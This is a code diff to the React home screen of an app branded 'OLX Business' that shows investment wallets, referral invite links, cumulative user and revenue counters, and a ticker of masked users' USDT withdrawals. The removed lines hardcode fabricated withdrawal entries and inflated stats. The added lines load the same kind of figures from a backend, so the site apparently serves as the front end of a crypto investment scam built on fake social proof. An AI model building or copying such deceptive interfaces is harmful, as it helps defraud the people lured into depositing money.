@@ -5,25 +5,11 @@ import { ReactNode, useEffect, useState } from "react";
 import { BrandLogo } from "@/components/BrandLogo";
 import { LanguageSwitch } from "@/components/LanguageSwitch";
 import { useLanguage } from "@/lib/i18n";
+import { inviteLink } from "@/lib/invite";
 import { getSessionAccount } from "@/lib/session";
 import { loadWallets } from "@/lib/wallets";
-import { getInviteCode, inviteLink } from "@/lib/invite";
 
 const LOG_ITEM_HEIGHT = 58;
-const LOGS = [
-  { user: "ah***21", amount: "150 USDT" },
-  { user: "sa***88", amount: "80 USDT" },
-  { user: "ol***09", amount: "220 USDT" },
-  { user: "mu***54", amount: "95 USDT" },
-  { user: "fa***17", amount: "310 USDT" },
-  { user: "bi***63", amount: "45 USDT" },
-  { user: "ha***02", amount: "180 USDT" },
-  { user: "ze***39", amount: "70 USDT" },
-  { user: "na***76", amount: "500 USDT" },
-  { user: "us***11", amount: "120 USDT" },
-  { user: "ir***48", amount: "60 USDT" },
-  { user: "ka***90", amount: "250 USDT" },
-];
 
 export function HomeScreen() {
   const { t } = useLanguage();
@@ -32,23 +18,56 @@ export function HomeScreen() {
   const [loggedIn, setLoggedIn] = useState(false);
   const [wallets, setWallets] = useState({ invest: 0, brokerage: 0 });
   const [inviteHref, setInviteHref] = useState("https://olx-business.app/register");
+  const [siteName, setSiteName] = useState("OLX Business");
+  const [stats, setStats] = useState({ users: 0, revenue: 0 });
+  const [logs, setLogs] = useState<{ user: string; amount: string }[]>([]);
 
   useEffect(() => {
-    setLoggedIn(Boolean(getSessionAccount()));
-    void loadWallets().then(setWallets);
+    const account = getSessionAccount();
+    setLoggedIn(Boolean(account));
     const origin = window.location.origin;
-    setInviteHref(inviteLink(origin, getInviteCode()));
+    const qs = account ? `?account=${encodeURIComponent(account)}` : "";
+    void fetch(`/api/home${qs}`)
+      .then((res) => (res.ok ? res.json() : null))
+      .then((data: {
+        siteName?: string;
+        users?: number;
+        revenue?: number;
+        logs?: { user: string; amount: string }[];
+        wallets?: { invest: number; brokerage: number; invite?: string };
+      } | null) => {
+        if (!data) {
+          void loadWallets().then(setWallets);
+          return;
+        }
+        if (data.siteName) setSiteName(data.siteName);
+        setStats({ users: Number(data.users) || 0, revenue: Number(data.revenue) || 0 });
+        setLogs(Array.isArray(data.logs) ? data.logs : []);
+        if (data.wallets) {
+          setWallets({ invest: data.wallets.invest, brokerage: data.wallets.brokerage });
+        } else {
+          void loadWallets().then(setWallets);
+        }
+        const code = data.wallets?.invite || "";
+        setInviteHref(code ? inviteLink(origin, code) : `${origin}/register`);
+      })
+      .catch(() => {
+        void loadWallets().then(setWallets);
+        setInviteHref(`${origin}/register`);
+      });
   }, []);
+
+  const logCount = logs.length || 1;
 
   useEffect(() => {
     const timer = setInterval(() => {
-      setLogIndex((current) => (current >= LOGS.length ? current : current + 1));
+      setLogIndex((current) => (current >= logCount ? current : current + 1));
     }, 2200);
     return () => clearInterval(timer);
-  }, []);
+  }, [logCount]);
 
   useEffect(() => {
-    if (logIndex !== LOGS.length) return;
+    if (logIndex !== logCount) return;
     const snap = window.setTimeout(() => {
       setLogInstant(true);
       setLogIndex(0);
@@ -68,7 +87,7 @@ export function HomeScreen() {
         <header className="relative mb-4 flex items-center justify-between">
           <div className="flex items-center gap-2">
             <BrandLogo size={42} />
-            <span className="text-[17px] font-semibold text-white">OLX Business</span>
+            <span className="text-[17px] font-semibold text-white">{siteName}</span>
           </div>
           <div className="flex items-center gap-3 text-sm text-white/85">
             <LanguageSwitch globe />
@@ -130,12 +149,12 @@ export function HomeScreen() {
         <div className="mb-4 grid grid-cols-2 gap-3">
           <StatCard
             icon={<UsersIcon />}
-            value={361906}
+            value={stats.users}
             label={t.cumulativeUsers}
           />
           <StatCard
             icon={<RevenueIcon />}
-            value={527951441}
+            value={stats.revenue}
             label={t.cumulativeRevenue}
             prefix="$"
           />
@@ -150,7 +169,7 @@ export function HomeScreen() {
               className={`log-track ${logInstant ? "log-track-instant" : ""}`}
               style={{ transform: `translateY(-${logIndex * LOG_ITEM_HEIGHT}px)` }}
             >
-              {[...LOGS, ...LOGS.slice(0, 3)].map((log, index) => (
+              {(logs.length ? [...logs, ...logs.slice(0, 3)] : [{ user: "—", amount: "0 USDT" }]).map((log, index) => (
                 <div key={`${log.user}-${index}`} className="log-item">
                   <div className="log-item-card">
                     {t.withdrawLog.replace("{user}", log.user).replace("{amount}", log.amount)}
